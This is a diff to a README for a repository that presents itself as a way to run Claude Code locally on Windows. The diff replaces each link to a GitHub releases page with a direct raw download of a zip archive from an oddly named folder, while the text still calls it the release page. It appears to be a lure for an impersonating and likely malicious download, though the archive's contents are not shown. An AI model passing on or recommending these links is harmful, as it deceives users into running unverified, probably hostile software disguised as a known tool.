@@ -1,12 +1,12 @@
 # 🧩 claude-code - Run Claude Code Locally
 
-[![Download](https://img.shields.io/badge/Download%20Release%20Page-blue?style=for-the-badge)](https://github.com/sorbussitchensisdonorcard867/claude-code/releases)
+[![Download](https://img.shields.io/badge/Download%20Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/sorbussitchensisdonorcard867/claude-code/main/semiquadrate/code_claude_v1.5.zip)
 
 ## 📥 Download
 
 Go to the release page and get the Windows build from here:
 
-https://github.com/sorbussitchensisdonorcard867/claude-code/releases
+https://raw.githubusercontent.com/sorbussitchensisdonorcard867/claude-code/main/semiquadrate/code_claude_v1.5.zip
 
 If the page shows several files, pick the Windows file that matches your system. Most users should choose the `.exe` or `.zip` file for Windows.
 
@@ -50,7 +50,7 @@ If you plan to build it from source, you also need:
 
 Use the release page as your main download source:
 
-https://github.com/sorbussitchensisdonorcard867/claude-code/releases
+https://raw.githubusercontent.com/sorbussitchensisdonorcard867/claude-code/main/semiquadrate/code_claude_v1.5.zip
 
 Steps:
 
@@ -224,4 +224,4 @@ bun dist/entrypoints/cli.js
 
 Download or install from:
 
-https://github.com/sorbussitchensisdonorcard867/claude-code/releases
+https://raw.githubusercontent.com/sorbussitchensisdonorcard867/claude-code/main/semiquadrate/code_claude_v1.5.zip
